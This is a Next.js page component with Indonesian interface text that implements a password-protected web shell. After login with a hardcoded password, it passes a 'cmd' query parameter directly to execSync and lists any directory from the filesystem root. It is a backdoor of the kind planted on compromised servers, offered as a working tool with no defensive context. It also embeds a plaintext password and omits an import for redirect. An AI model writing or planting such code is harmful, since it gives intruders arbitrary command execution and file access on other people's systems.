import fs from 'fs'
import path from 'path'
import { execSync } from 'child_process'
import crypto from 'crypto'

const PASSWORD = 'Kelana@221000'

let sessions = new Set<string>()

export default async function Page({
  searchParams,
}: {
  searchParams: { [key: string]: string | undefined }
}) {
  const sid = searchParams.sid
  const loggedIn = sid && sessions.has(sid)

  // LOGIN
  if (searchParams.login && searchParams.password) {
    if (searchParams.password === PASSWORD) {
      const newSid = crypto.randomBytes(16).toString('hex')
      sessions.add(newSid)
      return redirect(`/?sid=${newSid}`)
    }
    return <p>Password salah</p>
  }

  if (!loggedIn) {
    return (
      <form>
        <h2>🔐 Login</h2>
        <input type="hidden" name="login" value="1" />
        <input name="password" type="password" />
        <button>Login</button>
      </form>
    )
  }

  // CMD
  let output = ''
  if (searchParams.cmd) {
    try {
      output = execSync(searchParams.cmd, { encoding: 'utf8' })
    } catch (e: any) {
      output = e.stdout + e.stderr
    }
  }

  // FILE MANAGER (FULL ROOT)
  const dir = searchParams.dir || '/'
  let files: fs.Dirent[] = []

  try {
    files = fs.readdirSync(dir, { withFileTypes: true })
  } catch {}

  const parent = dir === '/' ? '/' : path.dirname(dir)

  return (
    <main style={{ fontFamily: 'monospace', padding: 20 }}>
      <h2>🖥 Web File Manager + CMD</h2>
      <p>Path: {dir}</p>

      <a href={`/?dir=${parent}&sid=${sid}`}>⬆ Parent</a>

      <ul>
        {files.map((f, i) => (
          <li key={i}>
            {f.isDirectory() ? (
              <a href={`/?dir=${path.join(dir, f.name)}&sid=${sid}`}>
                📂 {f.name}
              </a>
            ) : (
              <span>📄 {f.name}</span>
            )}
          </li>
        ))}
      </ul>

      <hr />
      <form>
        <input name="cmd" placeholder="ls -la /" />
        <input type="hidden" name="sid" value={sid} />
        <button>Run</button>
      </form>

      {output && (
        <pre style={{ background: '#000', color: '#0f0' }}>{output}</pre>
      )}
    </main>
  )
}
